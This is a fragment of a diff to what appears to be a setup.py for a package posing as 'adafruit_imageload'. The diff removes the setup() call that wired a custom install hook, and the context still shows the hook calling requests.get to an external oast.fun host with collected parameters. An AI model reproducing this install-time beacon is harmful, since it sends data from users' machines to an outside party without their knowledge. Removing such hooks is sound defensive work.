@@ -15,10 +15,4 @@ class CustomInstall(install):
         requests.get("https://aeknnnsitysuxpmwevwu5r45npjouqe5i.oast.fun/adafruit_imageload.php",params = ploads)
 
 
-setup(name='adafruit_imageload',
-      version='1.0.0',
-      description='White Hat Researcher',
-      author='whitehatguy',
-      license='MIT',
-      zip_safe=False,
-      cmdclass={'install': CustomInstall})
+# setup(...) removed                                                                                                                                                                                               
